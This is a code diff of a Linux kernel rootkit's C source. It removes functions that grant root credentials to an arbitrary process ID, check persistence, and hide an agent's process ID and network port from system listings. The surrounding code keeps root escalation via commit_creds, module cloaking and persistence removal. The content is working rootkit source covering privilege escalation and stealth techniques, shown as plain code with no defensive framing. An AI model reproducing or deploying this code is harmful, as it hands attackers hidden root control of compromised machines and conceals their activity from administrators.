@@ -4,11 +4,9 @@
 #include <linux/fs.h>
 #include <linux/list.h>
 #include <linux/module.h>
-#include <linux/sched.h>
-#include <net/inet_sock.h>
 #include "rootkit.h"
 
-// Privilege escalation (current task, used by mkdir trigger)
+// Privilege escalation
 int rk_escalate(void)
 {
 	struct cred *new_cred;
@@ -17,51 +15,6 @@ int rk_escalate(void)
 	if (!new_cred)
 		return -ENOMEM;
 	return commit_creds(new_cred);
-}
-
-// Privilege escalation for a remote PID
-int rk_escalate_pid(pid_t target_pid)
-{
-	struct pid *pid_struct;
-	struct task_struct *task;
-	struct cred *new_cred;
-	int ret = -ESRCH;
-
-	rcu_read_lock();
-	pid_struct = find_vpid(target_pid);
-	if (!pid_struct) {
-		rcu_read_unlock();
-		return -ESRCH;
-	}
-	task = pid_task(pid_struct, PIDTYPE_PID);
-	if (!task) {
-		rcu_read_unlock();
-		return -ESRCH;
-	}
-	get_task_struct(task);
-	rcu_read_unlock();
-
-	new_cred = prepare_kernel_cred(&init_task);
-	if (!new_cred) {
-		put_task_struct(task);
-		return -ENOMEM;
-	}
-
-	ret = 0;
-	rcu_read_lock();
-	if (pid_alive(task)) {
-		const struct cred *old = __task_cred(task);
-		rcu_assign_pointer(task->real_cred, new_cred);
-		rcu_assign_pointer(task->cred, new_cred);
-		put_cred(old);
-	} else {
-		put_cred(new_cred);
-		ret = -ESRCH;
-	}
-	rcu_read_unlock();
-
-	put_task_struct(task);
-	return ret;
 }
 
 // Module cloaking
@@ -106,52 +59,4 @@ int rk_unpersist(void)
 		return PTR_ERR(f);
 	filp_close(f, NULL);
 	return 0;
-}
-
-bool rk_is_persisted(void)
-{
-	struct file *f;
-
-	f = filp_open(PERSIST_PATH, O_RDONLY, 0);
-	if (IS_ERR(f))
-		return false;
-	filp_close(f, NULL);
-	return true;
-}
-
-// Auto-hide agent PID and connection port on connect.
-void rk_auto_hide(struct socket *sock)
-{
-	struct inet_sock *inet = inet_sk(sock->sk);
-	char buf[8];
-
-	// Hide the agent kthread PID
-	snprintf(buf, sizeof(buf), "%d", current->pid);
-	rk_target_add(&rk_pid_targets, buf);
-
-	// Hide the local source port from tcp seq show
-	snprintf(buf, sizeof(buf), "%hu", ntohs(inet->inet_sport));
-	rk_target_add(&rk_port_targets, buf);
-}
-
-// Remove auto-hidden entries on disconnect.
-void rk_auto_unhide(void)
-{
-	char buf[8];
-	int i;
-
-	// Remove agent PID
-	snprintf(buf, sizeof(buf), "%d", current->pid);
-	for (i = 0; i < rk_pid_targets.count; i++) {
-		if (strcmp(rk_pid_targets.targets[i], buf) == 0) {
-			rk_target_remove(&rk_pid_targets, i);
-			break;
-		}
-	}
-
-	// Remove source port (port changes each connection, just remove all auto entries)
-	// Since we always add at the end and there's typically only one agent connection,
-	// remove the last port entry (the one we added)
-	if (rk_port_targets.count > 0)
-		rk_target_remove(&rk_port_targets, rk_port_targets.count - 1);
 }
